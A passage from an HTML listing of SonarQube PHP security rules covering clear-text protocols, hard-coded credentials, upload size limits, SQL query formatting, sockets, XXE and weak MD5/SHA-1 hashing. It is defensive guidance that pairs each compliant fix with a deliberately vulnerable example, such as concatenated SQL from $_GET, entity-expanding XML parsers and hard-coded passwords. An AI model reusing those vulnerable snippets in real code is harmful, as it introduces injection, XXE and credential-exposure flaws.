  Monitoring Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring" rel="nofollow">OWASP Top 10 2017 Category A10</a> -
  Insufficient Logging &amp; Monitoring </li><li> <a href="https://cwe.mitre.org/data/definitions/117" rel="nofollow">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li><li> <a href="https://cwe.mitre.org/data/definitions/532" rel="nofollow">MITRE, CWE-532</a> - Information Exposure Through Log Files </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5332">
              php:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul><li> sensitive data exposure </li><li> traffic redirected to a malicious endpoint </li><li> malware-infected software update or installer </li><li> execution of client-side code </li><li> corruption of critical information </li></ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul><li> bypassing isolation mechanisms </li><li> compromising a component of the network </li><li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li></ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http" rel="nofollow">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169" rel="nofollow">CVE-2019-6169</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327" rel="nofollow">CVE-2019-12327</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065" rel="nofollow">CVE-2019-11065</a> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li><li> Application data transits over an untrusted network. </li><li> Compliance rules require the service to encrypt data in transit. </li><li> Your application renders web pages with a relaxed mixed content policy. </li><li> OS-level protections against clear-text traffic are deactivated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul><li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li><li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li><li> Use <code>https</code> instead of <code>http</code>. </li><li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li></ul>  </li><li> Enable encryption of cloud components communications whenever it is possible. </li><li> Configure your application to block mixed content when rendering web pages. </li><li> If available, enforce OS-level deactivation of all clear-text traffic. </li></ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
$url &#61; &#34;http://example.com&#34;; // Sensitive
$url &#61; &#34;ftp://anonymous&#64;example.com&#34;; // Sensitive
$url &#61; &#34;telnet://anonymous&#64;example.com&#34;; // Sensitive

$con &#61; ftp_connect(&#39;example.com&#39;); // Sensitive

$trans &#61; (new Swift_SmtpTransport(&#39;XXX&#39;, 1234)); // Sensitive

$mailer &#61; new PHPMailer(true); // Sensitive

define( &#39;FORCE_SSL_ADMIN&#39;, false); // Sensitive
define( &#39;FORCE_SSL_LOGIN&#39;, false); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
$url &#61; &#34;https://example.com&#34;;
$url &#61; &#34;sftp://anonymous&#64;example.com&#34;;
$url &#61; &#34;ssh://anonymous&#64;example.com&#34;;

$con &#61; ftp_ssl_connect(&#39;example.com&#39;);

$trans &#61; (new Swift_SmtpTransport(&#39;smtp.example.org&#39;, 1234))
  -&gt;setEncryption(&#39;tls&#39;)
;

$mailer &#61; new PHPMailer(true);
$mailer-&gt;SMTPSecure &#61; &#39;tls&#39;;

define( &#39;FORCE_SSL_ADMIN&#39;, true);
define( &#39;FORCE_SSL_LOGIN&#39;, true);
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html" rel="nofollow">Google, Moving towards more secure web</a> </li><li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/" rel="nofollow">Mozilla, Deprecating non secure http</a> </li><li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html" rel="nofollow">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li><li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html" rel="nofollow">AWS
  Documentation</a> - Stream Encryption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2068">
              php:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as &#34;oauthToken&#34;, &#34;secret&#34;, …​</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li><li> Credentials are used in production environments. </li><li> Application re-distribution is required before updating the credentials. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
$password &#61; &#34;65DBGgwe4uazdWQA&#34;; // Sensitive

$httpUrl &#61; &#34;https://example.domain?user&#61;user&amp;password&#61;65DBGgwe4uazdWQA&#34; // Sensitive
$sshUrl &#61; &#34;ssh://user:65DBGgwe4uazdWQA&#64;example.domain&#34; // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
$user &#61; getUser();
$password &#61; getPassword(); // Compliant

$httpUrl &#61; &#34;https://example.domain?user&#61;$user&amp;password&#61;$password&#34; // Compliant
$sshUrl &#61; &#34;ssh://$user:$password&#64;example.domain&#34; // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5693">
              php:S5693
            </a>
          </td>
          <td>
            <details>
              <p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in
order to prevents DoS attacks.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> size limits are not defined for the different resources of the web application. </li><li> the web application is not protected by <a href="https://en.wikipedia.org/wiki/Rate_limiting" rel="nofollow">rate limiting</a> features. </li><li> the web application infrastructure has limited resources. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> For most of the features of an application, it is recommended to limit the size of requests to:
    <ul><li> lower or equal to 8mb for file uploads. </li><li> lower or equal to 2mb for other requests. </li></ul>  </li></ul>
<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://symfony.com/doc/current/reference/constraints/File.html#maxsize" rel="nofollow">Symfony Constraints</a>:</p>
<pre>
use Symfony\Component\Validator\Constraints as Assert;
use Symfony\Component\Validator\Mapping\ClassMetadata;

class TestEntity
{
    public static function loadValidatorMetadata(ClassMetadata $metadata)
    {
        $metadata-&gt;addPropertyConstraint(&#39;upload&#39;, new Assert\File([
            &#39;maxSize&#39; &#61;&gt; &#39;100M&#39;, // Sensitive
        ]));
    }
}
</pre>
<p>For <a href="https://laravel.com/docs/8.x/validation#rule-max" rel="nofollow">Laravel Validator</a>:</p>
<pre>
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

class TestController extends Controller
{
    public function test(Request $request)
    {
        $validatedData &#61; $request-&gt;validate([
            &#39;upload&#39; &#61;&gt; &#39;required|file&#39;, // Sensitive
        ]);
    }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://symfony.com/doc/current/reference/constraints/File.html#maxsize" rel="nofollow">Symfony Constraints</a>:</p>
<pre>
use Symfony\Component\Validator\Constraints as Assert;
use Symfony\Component\Validator\Mapping\ClassMetadata;

class TestEntity
{
    public static function loadValidatorMetadata(ClassMetadata $metadata)
    {
        $metadata-&gt;addPropertyConstraint(&#39;upload&#39;, new Assert\File([
            &#39;maxSize&#39; &#61;&gt; &#39;8M&#39;, // Compliant
        ]));
    }
}
</pre>
<p>For <a href="https://laravel.com/docs/8.x/validation#rule-max" rel="nofollow">Laravel Validator</a>:</p>
<pre>
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

class TestController extends Controller
{
    public function test(Request $request)
    {
        $validatedData &#61; $request-&gt;validate([
            &#39;upload&#39; &#61;&gt; &#39;required|file|max:8000&#39;, // Compliant
        ]);
    }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html" rel="nofollow">Owasp Cheat Sheet</a> - Owasp Denial of Service
  Cheat Sheet </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/770" rel="nofollow">MITRE, CWE-770</a> - Allocation of Resources Without Limits or Throttling </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S6437">
              php:S6437
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>A hard-coded secret has been found in your code. You should quickly list where this secret is used, revoke it, and then change it in every system
that uses it.</p>
<p>Passwords, secrets, and any type of credentials should only be used to authenticate a single entity (a person or a system).</p>
<p>If you allow third parties to authenticate as another system or person, they can impersonate legitimate identities and undermine trust within the
organization.<br /> It does not matter if the impersonation is malicious: In either case, it is a clear breach of trust in the system, as the systems
involved falsely assume that the authenticated entity is who it claims to be.<br /> The consequences can be catastrophic.</p>
<p>Keeping credentials in plain text in a code base is tantamount to sharing that password with anyone who has access to the source code and runtime
servers.<br /> Thus, it is a breach of trust, as these individuals have the ability to impersonate others.</p>
<p>Secret management services are the most efficient tools to store credentials and protect the identities associated with them.<br /> Cloud providers
and on-premise services can be used for this purpose.</p>
<p>If storing credentials in a secret data management service is not possible, follow these guidelines:</p>
<ul><li> Do not store credentials in a file that an excessive number of people can access.
    <ul><li> For example, not in code, not in a spreadsheet, not on a sticky note, and not on a shared drive. </li></ul>  </li><li> Use the production operating system to protect password access control.
    <ul><li> For example, in a file whose permissions are restricted and protected with chmod and chown. </li></ul>  </li></ul>
<h3>Noncompliant code example</h3>
<pre>
use Defuse\Crypto\KeyOrPassword;

function createKey() {
    $password &#61; &#34;example&#34;;
    return KeyOrPassword::createFromPassword($password); // Noncompliant
}
</pre>
<h3>Compliant solution</h3>
<p>Modern web frameworks tend to provide a secure way to pass passwords and secrets to the code. For example, in Symfony you can use <a href="https://symfony.com/doc/current/configuration/secrets.html" rel="nofollow">vaults</a> to store your secrets. The secret values are referenced in the same way
as environment variables, so you can easily access them through <a href="https://symfony.com/doc/current/configuration.html#configuration-parameters" rel="nofollow">configuration parameters</a>.</p>
<pre>
use Defuse\Crypto\KeyOrPassword;

class PasswordService
{
    private string $password;

    public function setPassword(string $password): void
    {
        $this-&gt;password &#61; $password;
    }

    public function createKey(): KeyOrPassword
    {
        return KeyOrPassword::createFromPassword($this-&gt;password);
    }
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li><li> <a href="https://cwe.mitre.org/data/definitions/798.html" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259.html" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/OjdGBQ" rel="nofollow">CERT, MSC03-J.</a> - Never hard code sensitive information </li><li> <a href="https://symfony.com/doc/current/configuration/env_var_processors.html" rel="nofollow">Symfony</a> - Environment Variable Processors </li><li> <a href="https://symfony.com/doc/current/configuration.html#configuration-parameters" rel="nofollow">Symfony</a> - Configuring Symfony </li><li> <a href="https://symfony.com/doc/current/configuration/secrets.html" rel="nofollow">Symfony</a> - How to Keep Sensitive Information Secret </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2077">
              php:S2077
            </a>
          </td>
          <td>
            <details>
              <p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the
query. However, this rule doesn’t detect SQL injections (unlike rule <a href="/organizations/sopra-steria/rules?open&#61;php%3AS3649&amp;rule_key&#61;php%3AS3649" rel="nofollow">S3649</a>), the goal is only to highlight complex/formatted queries.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Some parts of the query come from untrusted values (like user inputs). </li><li> The query is repeated/duplicated in other parts of the code. </li><li> The application must support different types of relational databases. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use <a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html" rel="nofollow">parameterized queries, prepared
  statements, or stored procedures</a> and bind variables to SQL query parameters. </li><li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
$id &#61; $_GET[&#39;id&#39;];
mysql_connect(&#39;localhost&#39;, $username, $password) or die(&#39;Could not connect: &#39; . mysql_error());
mysql_select_db(&#39;myDatabase&#39;) or die(&#39;Could not select database&#39;);

$result &#61; mysql_query(&#34;SELECT * FROM myTable WHERE id &#61; &#34; . $id);  // Sensitive, could be susceptible to SQL injection

while ($row &#61; mysql_fetch_object($result)) {
    echo $row-&gt;name;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
$id &#61; $_GET[&#39;id&#39;];
try {
    $conn &#61; new PDO(&#39;mysql:host&#61;localhost;dbname&#61;myDatabase&#39;, $username, $password);
    $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $stmt &#61; $conn-&gt;prepare(&#39;SELECT * FROM myTable WHERE id &#61; :id&#39;);
    $stmt-&gt;execute(array(&#39;id&#39; &#61;&gt; $id));

    while($row &#61; $stmt-&gt;fetch(PDO::FETCH_OBJ)) {
        echo $row-&gt;name;
    }
} catch(PDOException $e) {
    echo &#39;ERROR: &#39; . $e-&gt;getMessage();
}
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised if one of the functions is called with hard-coded string (no concatenation) and this string does not contain a &#34;$&#34;
sign.</p>
<pre>
$result &#61; mysql_query(&#34;SELECT * FROM myTable WHERE id &#61; 42&#34;) or die(&#39;Query failed: &#39; . mysql_error());  // Compliant
</pre>
<p>The current implementation does not follow variables. It will only detect SQL queries which are concatenated or contain a <code>$</code> sign
directly in the function call.</p>
<pre>
$query &#61; &#34;SELECT * FROM myTable WHERE id &#61; &#34; . $id;
$result &#61; mysql_query($query);  // No issue will be raised even if it is Sensitive
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/89" rel="nofollow">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command
  </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> Derived from FindSecBugs rules <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA" rel="nofollow">Potential SQL/JPQL Injection
  (JPA)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO" rel="nofollow">Potential SQL/JDOQL Injection (JDO)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE" rel="nofollow">Potential SQL/HQL Injection (Hibernate)</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4818">
              php:S4818
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2011-1785" rel="nofollow">CVE-2011-178</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-5645" rel="nofollow">CVE-2017-5645</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-6597" rel="nofollow">CVE-2018-6597</a> </li></ul>
<p>Sockets are vulnerable in multiple ways:</p>
<ul><li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive
  sensitive information or inject dangerous input. </li><li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li></ul>
<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the
use of http connections.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> sockets are created without any limit every time a user performs an action. </li><li> input received from sockets is used without being sanitized. </li><li> sensitive data is sent via sockets without being encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li><li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li><li> <a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet" rel="nofollow">Sanitize</a> any input read from the socket. </li><li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
function handle_sockets($domain, $type, $protocol, $port, $backlog, $addr, $hostname, $local_socket, $remote_socket, $fd) {
    socket_create($domain, $type, $protocol); // Sensitive
    socket_create_listen($port, $backlog); // Sensitive
    socket_addrinfo_bind($addr); // Sensitive
    socket_addrinfo_connect($addr); // Sensitive
    socket_create_pair($domain, $type, $protocol, $fd);

    fsockopen($hostname); // Sensitive
    pfsockopen($hostname); // Sensitive
    stream_socket_server($local_socket); // Sensitive
    stream_socket_client($remote_socket); // Sensitive
    stream_socket_pair($domain, $type, $protocol); // Sensitive
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption (&#39;Resource Exhaustion&#39;) </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2755">
              php:S2755
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows the usage of external entities in XML.</p>
<h2>Why is this an issue?</h2>
<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without
proper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>
<h3>What is the potential impact?</h3>
<h4>Exposing sensitive data</h4>
<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can
reference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these
entities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe
threat to the confidentiality of critical information.</p>
<h4>Exhausting system resources</h4>
<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,
attackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading
to system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>
<h4>Forging requests</h4>
<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker
can make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as
retrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,
including unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE
attacks if an attacker can control the XML file that is processed.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$xml &#61; file_get_contents(&#39;xxe.xml&#39;);
$doc &#61; simplexml_load_string($xml, &#39;SimpleXMLElement&#39;, LIBXML_NOENT); // Noncompliant
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
$doc &#61; new DOMDocument();
$doc-&gt;load(&#39;xxe.xml&#39;, LIBXML_NOENT); // Noncompliant
</pre>
<pre data-diff-id="3" data-diff-type="noncompliant">
$reader &#61; new XMLReader();
$reader-&gt;open(&#39;xxe.xml&#39;);
$reader-&gt;setParserProperty(XMLReader::SUBST_ENTITIES, true); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>External entity substitution is disabled by default in <code>simplexml_load_string()</code> and <code>DOMDocument::open()</code>.</p>
<pre data-diff-id="1" data-diff-type="compliant">
$xml &#61; file_get_contents(&#39;xxe.xml&#39;);
$doc &#61; simplexml_load_string($xml, &#39;SimpleXMLElement&#39;);
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
$doc &#61; new DOMDocument();
$doc-&gt;load(&#39;xxe.xml&#39;);
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
$reader &#61; new XMLReader();
$reader-&gt;open(&#39;xxe.xml&#39;);
$reader-&gt;setParserProperty(XMLReader::SUBST_ENTITIES, false);
</pre>
<h3>How does this work?</h3>
<h4>Disable external entities</h4>
<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for
specific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the
appropriate properties or options in your XML parser library or framework.</p>
<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved
during XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are
processed.<br /> You should rely on features provided by your XML parser to restrict the external entities.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_%28XXE%29" rel="nofollow">OWASP Top 10 2017 Category A4</a> - XML External
  Entities (XXE) </li><li> <a href="https://cwe.mitre.org/data/definitions/611" rel="nofollow">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference </li><li> <a href="https://cwe.mitre.org/data/definitions/827" rel="nofollow">MITRE, CWE-827</a> - Improper Control of Document Type Definition </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2070">
              php:S2070
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;php%3AS4790&amp;rule_key&#61;php%3AS4790" rel="nofollow">S4790</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>
<p>Consider using safer alternatives, such as SHA-256, SHA-512 or SHA-3.</p>
<h3>Noncompliant code example</h3>
<pre>
$password &#61; ...

if (md5($password) &#61;&#61;&#61; &#39;1f3870be274f6c49b3e31a0c6728957f&#39;) { // Noncompliant; md5() hashing algorithm is not secure for password management
   [...]
}

if (sha1($password) &#61;&#61;&#61; &#39;d0be2dc421be4fcd0172e5afceea3970e2f3d940&#39;) { // Noncompliant; sha1() hashing algorithm is not secure for password management
   [...]
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
